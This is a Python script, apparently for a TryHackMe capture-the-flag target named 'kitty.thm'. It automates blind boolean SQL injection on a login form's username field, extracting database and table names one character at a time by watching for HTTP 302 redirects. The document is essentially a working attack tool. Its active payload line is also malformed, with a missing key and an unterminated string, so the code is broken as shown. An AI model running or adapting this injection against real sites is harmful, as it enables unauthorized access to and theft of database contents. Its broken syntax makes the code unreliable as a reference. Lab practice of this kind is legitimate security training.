import requests

ip = "kitty.thm"
chars_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/:~$^ "
c = ""

while True:
    for i in chars_list:
       # post_data= {"username":f"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '{c+i}%' -- -","password":"test"}
    	post_data= {' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE BINARY '{c+i}%' -- -
 , "password":"test"}
        req = requests.post(f"http://{ip}/index.php", data=post_data,allow_redirects=False)
        status_code=req.status_code
        print(f"{i}", end='\r')
        if status_code == 302:
            c = c+i
            print(f"[+] Updated Result ==> {c}")
            break
        elif i == " " :
            print("\n[+] Injection Finished")
            print(f"[+] Result ==> {c}")
            exit()
